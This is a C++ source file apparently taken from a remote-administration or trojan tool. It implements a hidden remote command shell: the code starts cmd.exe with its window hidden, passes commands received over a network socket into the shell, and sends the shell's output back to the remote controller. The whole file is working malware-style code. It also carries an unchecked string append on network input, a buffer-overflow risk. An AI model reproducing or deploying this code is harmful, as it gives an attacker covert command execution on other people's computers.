#include "StdAfx.h"
#include "ServCmd.h"
#include "ServSock.h"

CServCmd::CServCmd(void)
{
	hWrite1 = NULL;
	hRead2 = NULL;
	AllSock = INVALID_SOCKET;
}

CServCmd::~CServCmd(void)
{
}

void CServCmd::MyCmdCommend(COMMEND cmd, SOCKET sk)
{
	AllSock = sk;
	switch (cmd.fID)
	{
	case STARTCMD:
		Pipe2(sk);
		break;
	case WRITECMD:
		MyWriteCmd(cmd);
		break;
	default:
		break;
	}
}

void CServCmd::Pipe2(SOCKET sk)
{
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	HANDLE hRead1 = NULL, hWrite2 = NULL;
	if (!CreatePipe(&hRead1, &hWrite1, &sa, 0) || !CreatePipe(&hRead2, &hWrite2, &sa, 0))
	{
		MessageBox(NULL, _T("createpipe()filed!"), _T("tips"), NULL);
		m_ServSock->MySendCommond(sk, MYCMDSHELL, NULL, 0, STARTCMDERROR);
		return ;
	}
	wchar_t CmdPath[MAX_PATH];
	GetSystemDirectory(CmdPath, MAX_PATH);
	lstrcatW(CmdPath, _T("\\cmd.exe"));
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	GetStartupInfo(&si);
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hRead1;
	si.hStdOutput = si.hStdError = hWrite2;
	if (!CreateProcess(CmdPath, NULL, NULL, NULL, TRUE, 0, 0, NULL, &si, &pi))
	{
		MessageBox(NULL, _T("CreateProcess()filed!"), _T("tips"), NULL);
		m_ServSock->MySendCommond(sk,MYCMDSHELL,NULL,0,STARTCMDERROR);
	}
	CloseHandle(CreateThread(NULL, 0, MyReadGFUNC, this, NULL, NULL));
}

DWORD WINAPI CServCmd::MyReadGFUNC(LPVOID lp)
{
	CServCmd *pthis = (CServCmd*)lp;
	DWORD rRead = 0;
	while(1)
	{
		if (PeekNamedPipe(pthis->hRead2, 0, 0, 0, &rRead, NULL) && rRead > 0)
		{
			char buf[1024] = {0};
			ReadFile(pthis->hRead2, buf, 1024, &rRead, NULL);
			//MessageBox(NULL, buf, _T("tips"), NULL);
			if (_strcmpi(buf, "exit\r\n") == 0)
			{
				return 0;
			}
			pthis->m_ServSock->MySendCommond(pthis->AllSock, MYCMDSHELL, buf, 1024, STARTCMD);//此处发送的字符中带有客户端字符串指令
		}
		Sleep(100);
	}
	return 0;
}

void CServCmd::MyWriteCmd(COMMEND cmd)
{
	DWORD Rwr = 0;
	lstrcatA(cmd.teste, "\r\n");
	WriteFile(hWrite1, cmd.teste, lstrlenA(cmd.teste), &Rwr, NULL);
}